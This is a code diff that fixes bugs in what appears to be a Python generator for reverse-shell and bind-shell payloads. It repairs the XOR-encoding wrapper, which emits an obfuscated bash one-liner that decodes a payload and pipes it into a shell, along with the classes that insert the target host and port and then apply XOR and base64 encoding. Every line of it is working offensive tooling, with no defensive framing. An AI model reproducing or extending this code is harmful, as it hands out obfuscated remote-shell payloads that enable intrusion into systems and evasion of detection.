@@ -5,7 +5,7 @@ import urllib
 
 def xor_wrapper(name, code, args, shell="/bin/bash"):
     if args.xor is True:
-        if "powershell" in not in name.lower():
+        if "powershell" not in name.lower():
             code = """s="";for x in $(echo {0}|sed 's/../&\\\\n/g'); do s=$s$(echo -e $(awk "BEGIN {printf \\"%x\\n\\", xor(0x$x, {1})}"|sed 's/../\\\\x&/g'));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
             return code
         else:
@@ -39,7 +39,7 @@ class ReverseShell(object):
         self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
         
         # Apply xor encoding.
-        self.code = self.code if self.xor is 0 else xor_wrapper(self.name, self.code, self.args)
+        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
 
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
@@ -65,7 +65,7 @@ class BindShell(object):
         self.code = self.code.replace("PORT", str(self.port))
 
         # Apply xor encoding.
-        self.code = self.code if self.xor is 0 else xor_wrapper(self.name, self.code, self.ars)
+        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
 
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
